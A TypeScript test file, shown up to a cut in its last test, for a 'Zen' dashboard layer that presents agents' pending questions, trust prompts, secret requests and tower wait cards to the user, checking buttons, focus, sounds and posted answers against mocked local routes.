import assert from "node:assert/strict";
import { test } from "node:test";
import type { Item } from "../src/items.ts";
import type { Mark } from "../src/netdata.ts";
import type { Net, Unit } from "../src/net.ts";
import type { Pending } from "../src/ask.ts";
import { El, page, stored } from "./fake-dom.ts";
import { alertsOf } from "../gui/alerts.ts";
import { activityOf, companionsOf } from "../gui/zenunits.ts";
import { zenTrains } from "../gui/trains.ts";
import type { Chat, HistoryEvent } from "../gui/chat.ts";
import type { Answer } from "../gui/post.ts";
import type { With } from "../gui/zenmodel.ts";
import { m } from "../gui/paraglide/messages.js";

// The Zen layer (gui/zen.ts) as the page drives it: the net's snapshots go in, the card, the pause, or the companion comes out, and every answer goes through the same panels
// and routes as Standard (ask.ts, trust.ts, the composer), which are the real ones here on a fake document. The composer and the log are stand-ins that record what they are given.
import { hotkeyOf } from "../gui/hotkeys.ts";
import "../gui/zenrows.ts"; // the Zen chunk registers the Zen rows
/** A Zen keydown as the page routes it: the keymap's row for the face, then the layer's answer (what main.ts does through the core). */
const press = (z: { tap(): boolean }, target: unknown, key: string) => { const hot = hotkeyOf({ key, ctrlKey: false, altKey: false, metaKey: false, isComposing: false, defaultPrevented: false, target }, false, false, "zen"); return (hot === "pause" || hot === "talk") && z.tap(); }; // Enter is `talk` (it ends a pause, else unfolds the head tower's input), Space `pause`
const { mountZen, real } = await import("../gui/zen.ts");
const { onStep } = await import("../gui/terminalthen.ts");
type Exit = import("../gui/zen.ts").Exit;

const unit = (key: string, mark: Mark, o: Partial<Unit> = {}): Unit => ({ id: key, key, control: true, name: key, role: "main", mark, subs: [], ...o });
const net = (units: Unit[], trust: Net["trust"] = [], tower = true): Net => ({ bases: [{ id: "w", label: "Harbor", mark: "idle", tower: tower ? { name: "tower", mark: "idle", key: "t", control: true, subs: [] } : null, tabs: [{ id: "t1", label: "t", units }], outposts: [], outside: [] }], trust }) as Net;
const SELECT = (hereOnly = false) => ({ title: "Robot Hand: deploy", choices: ["Type it in a pane", "Copy it", "No thanks"].map((label) => ({ label, ...(hereOnly ? { hereOnly: true as const } : {}) })) });
const select = (o: { hereOnly?: boolean; cancel?: boolean; dialog?: string } = {}): Pending => ({ callId: "c1", tool: "robot_hand", answer: { dialog: o.dialog ?? "d1", digest: "0".repeat(64), select: SELECT(o.hereOnly), ...(o.cancel ? { cancel: true as const } : {}) } });
const questions = (): Pending => ({ callId: "c2", tool: "ask_user_question", answer: { dialog: "q1", digest: "1".repeat(64), cancel: true, questions: [{ question: "When?", header: "Window", multiple: false, options: [{ title: "Tonight" }, { title: "Tomorrow" }] }] } });
const secret = (): Pending => ({ callId: "c3", tool: "secret_drop", why: "It waits for a secret." });
const readonly = (): Pending => ({ callId: "c4", tool: "ask_user_question", why: "Two dialogs are open.", asks: [{ header: "A", question: "First?", options: [{ title: "x" }], multiple: false, freeform: false }] });
const TRUST = { id: "tr", digest: "d".repeat(64), folder: "/work/harbor", found: [{ kind: "skills", path: ".pi/skills", items: ["deploy"], more: 0 }], agents: [{ pane: "1", base: "Harbor", role: "member", at: 5 }] };

function rig(o: { offline?: boolean; ripple?: Record<string, unknown>; remote?: boolean | null; /** The companion the visit starts with: the tower `t` unless given; null for none. */ start?: With | null; latest?: () => Promise<{ items: Item[]; before?: string }>; z4b?: boolean; /** The strip also says the trains (todo #125 task 7). */ trains?: boolean; candidates?: (n: Net | undefined) => { key: string; ws: string }[] } = {}) {
	let t = 1_000_000;
	const timers: { at: number; fn: () => void }[] = [];
	const calls = { sound: [] as string[], leave: [] as Exit[], watch: [] as (string | null)[], remind: [] as string[], posts: [] as { key: string; action: string; body: Record<string, unknown> }[], trust: [] as Record<string, unknown>[], applied: [] as HistoryEvent[], settings: 0, composers: [] as { key: string; box: El; updates: unknown[]; post: (a: never, b: Record<string, unknown>) => Promise<Answer> }[], logs: [] as string[], embeds: [] as string[], debug: [] as string[], chats: [] as { away(): boolean }[], boxes: 0 };
	const replies: ((r: Answer) => void)[] = [];
	let netNow: Net | undefined;
	const items: Item[] = [{ id: "a1", kind: "assistant", text: "I need a decision." } as Item];
	const mounts = {
		...real,
		composer: ((root: El, key: string, post: never) => {
			const box = new El("textarea");
			root.replaceChildren(box);
			const c = { key, box, updates: [] as unknown[], post };
			calls.composers.push(c);
			return { box, update: (u: unknown) => c.updates.push(u) };
		}) as never,
		chat: async () => (root: El, _data: unknown, deps: unknown) => (calls.logs.push("mounted"), calls.chats.push(deps as { away(): boolean }), { apply: (e: HistoryEvent) => calls.applied.push(e), setLive() {}, reveal() {}, box: () => void calls.boxes++ } as unknown as Chat),
	};
	const deps = {
		debug: (line: string) => void calls.debug.push(line),
		data: () => ({ older: async () => ({ items: [] }), latest: o.latest ?? (async () => ({ items })), entry: async () => undefined }),
		recent: async () => items,
		post: (key: string) => (action: string, body: Record<string, unknown>) => (calls.posts.push({ key, action, body }), new Promise<Answer>((resolve) => replies.push(resolve))),
		trust: (body: Record<string, unknown>) => (calls.trust.push(body), new Promise<Answer>((resolve) => replies.push(resolve))),
		label: (ws: string) => (ws === "w" ? "Harbor" : ws), online: () => !o.offline,
		remind: (a: { key: string }) => void calls.remind.push(a.key), sound: (s: string) => void calls.sound.push(s), leave: (e: Exit) => void calls.leave.push(e), terminals: async () => ({ embed: (key: string) => (calls.embeds.push(key), () => {}), watch: () => ({ conn: {}, stop() {} }), post: () => async () => ({ ok: true, status: 200, body: {} }), stream: () => "st" }), watch: (k: string | null) => void calls.watch.push(k),
		remote: o.remote === null ? undefined : (o.remote ?? false), now: () => t, start: () => (o.start === null ? undefined : (o.start ?? { key: "t", ws: "w" })),
		fs: { doc: { addEventListener() {}, documentElement: {} }, standalone: () => false, touch: () => false, seen: { getItem: () => "1", setItem() {} }, later: () => () => {} }, // no full screen here: the control hides
		still: () => false, random: () => 0, ...(o.ripple ? { ripple: o.ripple } : {}),
		...(o.z4b ? { companions: () => (o.candidates ?? companionsOf)(netNow), activity: () => activityOf(netNow), ...(o.trains ? { trains: () => zenTrains(netNow) } : {}), settings: () => void calls.settings++, menu: { sound: { effects: { on: () => false, volume: () => 50, set() {}, setVolume() {}, try() {}, onChange() {} }, background: { on: () => false, volume: () => 50, set() {}, setVolume() {}, try() {}, onChange() {} } } } } : {}),
		later: (fn: () => void, ms: number) => {
			const e = { at: t + ms, fn };
			timers.push(e);
			return () => void (timers.includes(e) && timers.splice(timers.indexOf(e), 1));
		},
	};
	const root = new El("section");
	page.body.replaceChildren(root);
	[page.focused, page.hidden, page.focus] = [undefined, false, true];
	const z = mountZen(root as unknown as HTMLElement, deps as never, mounts as never);
	const settle = () => new Promise((done) => setImmediate(done));
	const advance = async (ms: number) => {
		t += ms;
		for (;;) {
			const due = timers.filter((e) => e.at <= t).sort((a, b) => a.at - b.at)[0];
			if (!due) break;
			timers.splice(timers.indexOf(due), 1);
			due.fn();
		}
		await settle();
	};
	return {
		z, root, calls, advance, settle, items, now: () => t, pending: () => timers.map((e) => e.at - t),
		feed: (n: Net) => ((netNow = n), z.net(alertsOf(n, t), n)),
		reply: async (body: Record<string, unknown>, status = 200) => (replies.shift()!({ ok: status < 400, status, body }), await settle()),
		button: (text: string) => root.all((el) => el.tagName === "button" && el.textContent === text)[0],
		by: (match: (el: El) => boolean) => root.all(match),
		text: () => root.textContent,
	};
}
const ok = { outcome: "accepted" };

test("an answerable select draws through the dialog's own panel: Send, Cancel where the owner takes one, and Not now; the first option takes the focus", async () => {
	const r = rig();
	r.feed(net([unit("a", "waiting", { name: "ops-main", since: 5, pending: select({ cancel: true }) })]));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	assert.equal(r.root.hidden, false);
	assert.deepEqual(r.calls.sound, ["bowl"], "the bowl as the item takes the screen");
	assert.ok(r.text().includes("ops-main") && r.text().includes("Harbor"), "who asks, and from which base");
	assert.ok(r.text().includes("I need a decision."), "what it last said");
	for (const label of ["Send answer", "Cancel", "Maybe later"]) assert.ok(r.button(label), label);
	assert.equal(r.button("Show terminal"), undefined);
	assert.equal(page.focused, r.by((el) => el.getAttribute("role") === "radio")[0], "the focus goes to the first answer control");
	assert.equal(r.by((el) => el.getAttribute("aria-live") === "polite")[0]!.textContent, "ops-main wants to ask you");
	assert.ok(!r.button("Cancel")!.disabled);
	r.by((el) => el.getAttribute("role") === "radio")[2]!.click();
	r.button("Send answer")!.click();
	assert.deepEqual(r.calls.posts.map((p) => [p.key, p.action, p.body.choice, p.body.dialog]), [["a", "answer", 2, "d1"]], "the same route and body as Standard");
});

test("an accepted answer that leaves a step in a terminal opens the card of the unit's own terminal: the step names the asking unit's key (M34)", async () => {
	const steps: unknown[] = [];
	onStep((step) => steps.push(step));
	try {
		const r = rig();
		r.feed(net([unit("a", "waiting", { name: "ops-main", since: 5, pending: select() })]));
		r.z.show();
		await r.settle();
		r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
		await r.settle();
		r.by((el) => el.getAttribute("role") === "radio")[0]!.click();
		r.button("Send answer")!.click();
		await r.reply({ outcome: "accepted", then: { terminal: true } });
		assert.deepEqual(steps, [{ kind: "prompt", key: "a", asker: "a", command: undefined }]);
	} finally {
		onStep(undefined);
	}
});

test("a questionnaire has Send and Cancel; no Cancel without an owner that takes one", async () => {
	const r = rig();
	r.feed(net([unit("a", "waiting", { since: 5, pending: questions() })]));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	assert.ok(r.button("Send answer") && r.button("Cancel") && r.button("Maybe later"));
	const again = rig();
	again.feed(net([unit("a", "waiting", { since: 5, pending: select() })]));
	again.z.show();
	await again.settle();
	again.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await again.settle();
	assert.equal(again.button("Cancel"), undefined, "the owner did not say it takes a cancel");
	assert.ok(again.button("Maybe later"), "Not now is on every card");
});

const several = (): Pending => ({ callId: "c5", tool: "ask_user_question", answer: { dialog: "q2", digest: "2".repeat(64), cancel: true, questions: [{ question: "Ship it?", header: "Ship", multiple: false, options: [{ title: "Yes" }, { title: "No" }] }, { question: "Which channels?", header: "Channels", multiple: false, options: [{ title: "email" }, { title: "chat" }] }] } });

test("a card with several questions puts them in one column with the first focused; one question stays as it was; the same dialog on a new snapshot keeps its scroller and the pick", async () => {
	const r = rig();
	r.feed(net([unit("a", "waiting", { since: 5, pending: several() })]));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	const scrollers = () => r.by((el) => el.getAttribute("class") === "zen-qs");
	assert.equal(scrollers().length, 1);
	const blocks = scrollers()[0]!.children, radios = r.by((el) => el.getAttribute("role") === "radio");
	assert.deepEqual(blocks.map((b) => b.dataset.dim !== undefined), [false, true], "the first is focused, the other faded");
	assert.equal(page.focused, radios[0], "the keyboard focus lands inside the focused question");
	assert.ok(r.button("Send answer") && !scrollers()[0]!.all((el) => el.textContent === "Send answer").length, "Send is outside the scroller");
	const note = r.by((el) => el.getAttribute("aria-label") === "Note")[0]!;
	note.focus();
	note.bubble("keydown", { key: "Tab", shiftKey: false });
	assert.deepEqual(blocks.map((b) => b.dataset.dim !== undefined), [true, false], "Tab moves the focus to the second question");
	assert.equal(page.focused, radios[2]);
	radios[0]!.click();
	r.feed(net([unit("a", "waiting", { since: 5, pending: several() })]));
	await r.settle();
	assert.equal(scrollers().length, 1);
	assert.equal(scrollers()[0], blocks[0]!.parent, "the same scroller");
	assert.equal(r.by((el) => el.getAttribute("role") === "radio")[0]!.getAttribute("aria-checked"), "true", "the pick survived the snapshot");
	const one = rig();
	one.feed(net([unit("a", "waiting", { since: 5, pending: questions() })]));
	one.z.show();
	await one.settle();
	one.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await one.settle();
	assert.equal(one.by((el) => el.getAttribute("class") === "zen-qs").length, 0, "a single question is not wrapped");
});

test("Zen hands its injected remote to the dialog: on a paired device a hereOnly choice is disabled and Cancel needs a choice the device may give; on this computer both are offered", async () => {
	const paired = rig({ remote: true });
	paired.feed(net([unit("a", "waiting", { since: 5, pending: select({ cancel: true }) })]));
	paired.z.show();
	await paired.settle();
	paired.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await paired.settle();
	assert.ok(paired.button("Cancel"), "some choice is the device's to give");
	const here = rig({ remote: true });
	here.feed(net([unit("a", "waiting", { since: 5, pending: select({ cancel: true, hereOnly: true }) })]));
	here.z.show();
	await here.settle();
	here.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await here.settle();
	assert.equal(here.button("Cancel"), undefined, "every choice is hereOnly: a cancel would be refused as well");
	assert.ok(here.by((el) => el.getAttribute("role") === "radio").every((o) => o.disabled), "the hereOnly choices are shown, disabled");
	// the host says this computer; the injected remote wins
	Object.assign(globalThis, { location: { hostname: "127.0.0.1" } });
	const local = rig({ remote: false });
	local.feed(net([unit("a", "waiting", { since: 5, pending: select({ cancel: true, hereOnly: true }) })]));
	local.z.show();
	await local.settle();
	local.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await local.settle();
	assert.ok(local.by((el) => el.getAttribute("role") === "radio").every((o) => !o.disabled), "this computer's page may give them");
	assert.ok(local.button("Cancel"));
	Object.assign(globalThis, { location: { hostname: "192.168.1.7" } });
	const injected = rig({ remote: false });
	injected.feed(net([unit("a", "waiting", { since: 5, pending: select({ cancel: true, hereOnly: true }) })]));
	injected.z.show();
	await injected.settle();
	injected.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await injected.settle();
	assert.ok(injected.by((el) => el.getAttribute("role") === "radio").every((o) => !o.disabled), "an injected remote of false beats a paired host");
});

test("a secret_drop is read-only on every page with no Open the terminal; any other read-only dialog offers it, which opens the unit's terminal in Zen's own layer", async () => {
	for (const remote of [false, true]) {
		const r = rig({ remote });
		r.feed(net([unit("a", "waiting", { since: 5, pending: secret() })]));
		r.z.show();
		await r.settle();
		r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
		await r.settle();
		assert.equal(r.button("Send answer"), undefined);
		assert.equal(r.button("Open the terminal"), undefined, "a secret is entered in the terminal only");
		assert.equal(r.button("Show terminal"), undefined);
		assert.ok(r.button("Maybe later"));
	}
	const r = rig();
	r.feed(net([unit("a", "waiting", { since: 5, pending: readonly() })]));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	assert.equal(r.button("Send answer"), undefined);
	assert.equal(r.button("Show terminal"), undefined, "Zen words it Open the terminal");
	r.button("Open the terminal")!.click();
	await new Promise((done) => setImmediate(done)); // the page's terminals come behind their chunk
	assert.deepEqual([r.calls.leave, r.calls.embeds], [[], ["a"]], "the terminal opens inside Zen: Standard is not visited");
});

test("a trust question draws the trust panel with its three choices, answers through trust/answer, and has Not now", async () => {
	const r = rig();
	r.feed(net([], [TRUST]));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	assert.ok(r.text().includes("Trust this folder?") && r.text().includes("/work/harbor"));
	for (const label of ["Trust", "Trust this time", "Don't trust", "Maybe later"]) assert.ok(r.button(label), label);
	r.button("Trust this time")!.click();
	assert.equal(r.calls.trust.length, 1);
	assert.deepEqual([r.calls.trust[0]!.id, r.calls.trust[0]!.choice], ["tr", "once"]);
	await r.reply(ok);
	assert.deepEqual(r.calls.sound, ["bowl", "knock"]);
});

const waitNet = (r: { now(): number }, text = "Boss token needed to add the ACL") => {
	const n = net([]);
	n.bases[0]!.tower!.service = { state: "standing", queued: 0, allyRuns: [], notices: [], parked: [], memory: { rev: 1, standing: 0, decisions: 0, waits: 1, bossWaits: [{ id: "W2", text, at: new Date(r.now() - 60_000).toISOString() }], proposals: [] } };
	return n;
};
/** The wait card's answer box: the textarea inside the card's answer slot, and the note under it. */
const waitBox = (r: ReturnType<typeof rig>) => r.by((el) => el.classes.has("wait-box"))[0]!;
const waitNote = (r: ReturnType<typeof rig>) => r.by((el) => el.classes.has("ask-note"))[0]!;
const enter = (box: El) => box.bubble("keydown", { key: "Enter", shiftKey: false, isComposing: false, keyCode: 13 });

test("a wait the tower recorded on the boss is an item with its words, the reply fold, Skip, and Not now, and no terminal to open; Skip's second tap has the server decline it", async () => {
	const sent: { path: string; body: unknown }[] = [];
	Object.assign(globalThis, { fetch: async (path: string, init: { body: string }) => (sent.push({ path, body: JSON.parse(init.body) }), { ok: true, status: 200, json: async () => ({ rev: 2, proposals: [], entries: [] }) }) });
	const r = rig({ start: null }); // no session for company: the card is the only thing with a box
	r.feed(waitNet(r));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	assert.ok(r.text().includes("Boss token needed to add the ACL") && r.text().includes("tower"), "what it waits for, and who");
	for (const label of ["Reply to the tower", "Skip", "Ask the tower to rewrite it", "Maybe later"]) assert.ok(r.button(label), label);
	assert.equal(r.button("Open the terminal"), undefined, "a wait is not a pane blocked on a prompt");
	assert.equal(r.calls.composers.length, 0, "no companion composer on the card: the answer box is the card's own");
	r.button("Skip")!.click();
	assert.deepEqual(sent, [], "Skip takes a second tap: Send");
	r.button("Send")!.click();
	await r.settle();
	assert.deepEqual(sent, [{ path: "api/tower/w/memory", body: { op: "press", id: "W2", act: "decline" } }]);
	assert.deepEqual(r.calls.sound, ["bowl", "knock"], "an accepted answer: the knock");
});

test("Handle unfolds the answer box right under the question on the same card, focused, and never leaves Zen for Standard", async () => {
	const r = rig();
	r.feed(waitNet(r));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	const box = waitBox(r);
	assert.equal(box.hidden, true, "folded until Reply is picked");
	r.button("Reply to the tower")!.click();
	assert.deepEqual(r.calls.leave, [], "the view does not change");
	assert.equal(box.hidden, false);
	assert.equal(page.focused, box, "the box has the focus");
	const card = r.by((el) => el.classes.has("zen-card"))[0]!, order = card.all(() => true);
	assert.ok(order.indexOf(r.by((el) => el.classes.has("zen-said"))[0]!) < order.indexOf(box), "the box sits under the question");
	assert.equal(r.by((el) => el.classes.has("zen-card")).length, 1, "the same card");
	for (const label of ["Skip", "Maybe later", "Send"]) assert.ok(r.button(label), `${label} stays`);
	assert.equal(r.button("Reply to the tower")!.getAttribute("aria-checked"), "true", "Reply is what is picked now");
});

test("sending posts the boss's words to the tower exactly as Standard's composer does; the card leaves with the knock and Zen returns to the circle", async () => {
	const r = rig();
	r.feed(waitNet(r));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	r.button("Reply to the tower")!.click();
	const box = waitBox(r);
	box.value = "Use the staging token";
	enter(box);
	await r.settle();
	assert.deepEqual(r.calls.posts, [{ key: "t", action: "input", body: { text: "Use the staging token", as: "send", answers: "W2" } }], "the tower's session `input`, the route Standard's composer sends to, naming the wait it answers");
	await r.reply({ accepted: true, woke: true }); // the input route's reply has no `outcome`
	assert.deepEqual(r.calls.sound, ["bowl", "knock"]);
	assert.deepEqual(r.calls.leave, []);
	await r.advance(1300);
	await r.advance(1500); // the card dissolves for a moment after the outcome
	assert.equal(r.by((el) => el.classes.has("zen-circle")).length >= 1, true, "the breathing circle");
	assert.equal(r.by((el) => el.classes.has("zen-card")).length, 0, "no card");
	assert.equal(r.text().includes("Boss token needed"), false);
});

// A wait card in Zen's skin (docs/specs/2026-11-07-wait-cards.md): the same card as everywhere, its press wrapped so the outcome follows (the knock), except the secret card's first step, which ends nothing.
const cardWaitNet = (r: { now(): number }, card: Record<string, unknown>, press?: Record<string, unknown>) => {
	const n = net([]);
	n.bases[0]!.tower!.service = { state: "standing", queued: 0, allyRuns: [], notices: [], parked: [], memory: { rev: 1, standing: 0, decisions: 0, waits: 1, bossWaits: [{ id: "W2", text: String(card.do), at: new Date(r.now() - 60_000).toISOString(), card, ...(press ? { press } : {}) }], proposals: [] } } as never;
	return n;
};
const FROM = { name: "mp3946-print", role: "main", workspace: "MP Center", tab: "MP-3946" };
const ZCARD = { type: "choice", lang: "en", happened: "The ledger fix is merged on main.", do: "Roll the ledger fix out tonight, or wait for Friday?", options: [{ label: "Tonight", then: "The tower asks the main to deploy now." }, { label: "Friday", then: "The tower holds the fix until Friday." }], from: FROM };

test("a wait card in Zen is the whole card; a choice's option presses at the memory route and the card leaves with the knock", async () => {
	const sent: { path: string; body: unknown }[] = [];
	Object.assign(globalThis, { fetch: async (path: string, init: { body: string }) => (sent.push({ path, body: JSON.parse(init.body) }), { ok: true, status: 200, json: async () => ({ rev: 2, proposals: [], entries: [], press: { act: "choose", option: 1, at: new Date().toISOString() } }) }) });
	const r = rig({ start: null });
	r.feed(cardWaitNet(r, ZCARD));
	r.z.show();
	await r.settle();
	r.z.key("talk");
	await r.settle();
	for (const part of [ZCARD.happened, ZCARD.do, m.wc_tag_choice(), "Tonight", "Friday", "The tower holds the fix until Friday."]) assert.ok(r.text().includes(part), part);
	assert.equal(r.by((el) => el.classes.has("zen-said"))[0]!.hidden, true, "the card says it, not the tower's last words");
	assert.equal(r.by((el) => el.classes.has("wc-primary")).length, 0, "a choice has no primary");
	r.by((el) => el.tagName === "button" && el.dataset.option === "1")[0]!.click();
	await r.settle();
	assert.deepEqual(sent, [], "a pick alone presses nothing (the confirm card's behaviour)");
	r.button("Send")!.click();
	await r.settle();
	assert.deepEqual(sent, [{ path: "api/tower/w/memory", body: { op: "press", id: "W2", act: "choose", option: 1 } }]);
	assert.deepEqual(r.calls.sound, ["bowl", "knock"], "an accepted press: the knock");
});

test("a wait card in Zen offers Open <raiser> like the other hosts: the click leaves Zen for the raiser's session, and the router never sees it", async () => {
	const r = rig({ start: null });
	const n = cardWaitNet(r, { ...ZCARD, type: "action", options: undefined, do: "Re-authorize the machine.", from: { ...FROM, key: "mp-main" } });
	n.bases[0]!.tabs[0]!.units.push(unit("mp-main", "working", { name: "mp3946-print" }));
	r.feed(n);
	r.z.show();
	await r.settle();
	r.z.key("talk");
	await r.settle();
	const link = r.by((el) => el.classes.has("wc-main"))[0]!;
	assert.equal(link.textContent, m.wc_b_main({ name: "mp3946-print" }));
	let prevented = false;
	(link.onclick as unknown as (e: object) => void)({ preventDefault: () => (prevented = true), stopPropagation() {} });
	assert.ok(prevented);
	assert.deepEqual(r.calls.leave, [{ route: { view: "session", ws: "w", key: "mp-main" } }]);
});

test("a secret card in Zen: the first step leaves the card for its second, with no knock", async () => {
	const sent: unknown[] = [];
	Object.assign(globalThis, { fetch: async (_path: string, init: { body: string }) => (sent.push(JSON.parse(init.body)), { ok: true, status: 200, json: async () => ({ rev: 2, proposals: [], entries: [], press: { act: "secret", at: new Date().toISOString(), secretAsked: new Date().toISOString() } }) }) });
	const r = rig({ start: null, remote: false });
	r.feed(cardWaitNet(r, { ...ZCARD, type: "secret", options: undefined, secret: { name: "Tailscale auth key" } }));
	r.z.show();
	await r.settle();
	r.z.key("talk");
	await r.settle();
	r.button(m.wc_b_start())!.click();
	r.button("Send")!.click();
	await r.settle();
	assert.deepEqual(sent, [{ op: "press", id: "W2", act: "secret" }]);
	assert.deepEqual(r.calls.sound, ["bowl"], "no knock: nothing ended");
	assert.equal(r.by((el) => el.classes.has("zen-card")).length, 1, "the card stays");
	assert.ok(r.text().includes(m.wc_secret_asked({ name: "mp3946-print", tab: "MP-3946" })));
});

test("a secret card on a paired device in Zen has no start button", async () => {
	const r = rig({ start: null, remote: true });
	r.feed(cardWaitNet(r, { ...ZCARD, type: "secret", options: undefined, secret: { name: "Tailscale auth key" } }));
	r.z.show();
	await r.settle();
	r.z.key("talk");
	await r.settle();
	assert.equal(r.button(m.wc_b_start()), undefined);
	assert.ok(r.text().includes(m.wc_at_computer()));
	assert.equal(r.by((el) => el.classes.has("wc-primary")).length, 0);
});

test("Esc while the answer is on its way does not fold the box, so a refusal lands in an open box with the focus back in it", async () => {
	const r = rig();
	r.feed(waitNet(r));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	r.button("Reply to the tower")!.click();
	const box = waitBox(r);
	box.value = "Use the staging token";
	enter(box);
	await r.settle();
	assert.equal(r.calls.posts.length, 1, "on its way");
	r.z.escape({ preventDefault: () => {} });
	assert.equal(box.hidden, false, "Esc leaves the box as it is while the answer is on its way");
	await r.reply({ error: "refused", reason: "The tower did not take it." }, 409);
	assert.equal(box.hidden, false, "the box is open for the refusal");
	assert.match(waitNote(r).textContent, /^Not sent/);
	assert.equal(page.focused, box, "and has the focus again");
});

const answeredNet = (r: { now(): number }, extra: { id: string; text: string }[] = []) => {
	const n = waitNet(r);
	const memory = n.bases[0]!.tower!.service!.memory!;
	memory.bossWaits = [{ ...memory.bossWaits[0]!, answered: new Date(r.now()).toISOString() }, ...extra.map((w) => ({ ...w, at: new Date(r.now() - 30_000).toISOString() }))];
	return n;
};

test("once the server marks the wait answered the card does not come back while the tower handles it, however long that takes; a wait the tower writes anew asks as a card", async () => {
	const r = rig();
	r.feed(waitNet(r));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	r.button("Reply to the tower")!.click();
	waitBox(r).value = "Use the staging token";
	enter(waitBox(r));
	await r.settle();
	await r.reply({ accepted: true, woke: true, answered: "W2" });
	await r.advance(1300);
	await r.advance(1500);
	r.feed(answeredNet(r)); // the next snapshot: the wait stays in the tower's memory, answered
	await r.advance(30_000 + 1000); // past the 30 s hold of an answered card
	assert.equal(r.by((el) => el.classes.has("zen-card")).length, 0, "no card");
	await r.advance(600_000);
	assert.equal(r.by((el) => el.classes.has("zen-card")).length, 0, "not after ten minutes either");
	r.feed(answeredNet(r, [{ id: "W3", text: "Which region for the new bucket?" }]));
	await r.settle();
	assert.equal(cards(r), 0, "a new wait waits for Enter");
	r.z.key("talk");
	await r.settle();
	assert.ok(r.text().includes("Which region for the new bucket?"), "a new wait asks");
});

test("a wait answered on another device while its card is on the page ends the card without the low bowl: it is no longer something the boss has to do", async () => {
	const r = rig();
	r.feed(waitNet(r));
	r.z.show();
	await r.settle();
	r.feed(answeredNet(r));
	await r.advance(1500);
	assert.equal(r.by((el) => el.classes.has("zen-card") && !el.hasAttribute("data-gone")).length, 0, "the card is gone (or going)");
	assert.equal(r.calls.sound.includes("low"), false);
});

test("Esc on the open box folds it with the draft kept and does nothing else; Shift+Enter and an empty box send nothing", async () => {
	const r = rig();
	r.feed(waitNet(r));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	r.button("Reply to the tower")!.click();
	const box = waitBox(r);
	box.value = "half a thought";
	box.bubble("keydown", { key: "Enter", shiftKey: true, isComposing: false, keyCode: 13 });
	box.value = "";
	enter(box);
	box.value = "half a thought";
	await r.settle();
	assert.deepEqual(r.calls.posts, []);
	let prevented = 0;
	const took = r.z.escape({ preventDefault: () => void prevented++ });
	assert.deepEqual([took, prevented], [true, 1]);
	assert.equal(box.hidden, true, "folded");
	assert.equal(box.value, "half a thought", "the draft stays");
	assert.ok(r.by((el) => el.classes.has("zen-card")).length === 1 && r.calls.sound.join() === "bowl", "the card stays; Esc did not skip it");
	assert.equal(page.focused, r.button("Reply to the tower"), "the focus returns to the Reply row");
	r.button("Reply to the tower")!.click();
	assert.equal(box.value, "half a thought", "picking Reply again brings the draft back");
});

test("a refusal shows under the kept draft in Zen's refusal style, plays the low bowl, and the box stays open for another try", async () => {
	const r = rig();
	r.feed(waitNet(r));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	r.button("Reply to the tower")!.click();
	const box = waitBox(r);
	box.value = "Use the staging token";
	enter(box);
	await r.settle();
	await r.reply({ error: "standing", reason: "The tower is not running." }, 409);
	assert.equal(box.value, "Use the staging token", "the draft is kept");
	assert.equal(box.disabled, false);
	assert.match(waitNote(r).textContent, /^Not sent: the tower is standing by/);
	assert.equal(waitNote(r).dataset.tone, "error");
	assert.deepEqual(r.calls.sound, ["bowl", "low"]);
	assert.equal(r.by((el) => el.classes.has("zen-card")).length, 1, "the card stays");
	enter(box);
	await r.settle();
	await r.reply({ accepted: true });
	assert.deepEqual(r.calls.sound, ["bowl", "low", "knock"], "the second try is taken: the knock after the low bowl");
});

test("the wait card names the unit once, in the page's language, and the unit's raw English name is not on it", async () => {
	const { overwriteGetLocale } = await import("../gui/paraglide/runtime.js");
	for (const [locale, name] of [["en", "tower · Harbor"], ["zh-TW", "塔台 · Harbor"]] as const) {
		overwriteGetLocale(() => locale);
		const r = rig();
		const n = waitNet(r);
		n.bases[0]!.tower!.name = "tower · Harbor";
		r.feed(n);
		r.z.show();
		await r.settle();
		r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
		await r.settle();
		const text = r.by((el) => el.classes.has("zen-card"))[0]!.textContent;
		assert.equal(text.split(name).length - 1, 1, `${locale}: the unit once on the card`);
		assert.equal(r.by((el) => el.classes.has("zen-who"))[0]!.textContent, name, `${locale}: the title`);
		if (locale === "zh-TW") assert.equal(text.includes("tower"), false, "no raw English name");
	}
	overwriteGetLocale(() => "en");
});

test("a trust question's choices are disabled while the link is offline and enabled while it is live", async () => {
	for (const offline of [true, false]) {
		const r = rig({ offline });
		r.feed(net([], [TRUST]));
		r.z.show();
		await r.settle();
		r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
		await r.settle();
		const choices = ["Trust", "Trust this time", "Don't trust"].map((label) => r.button(label)!);
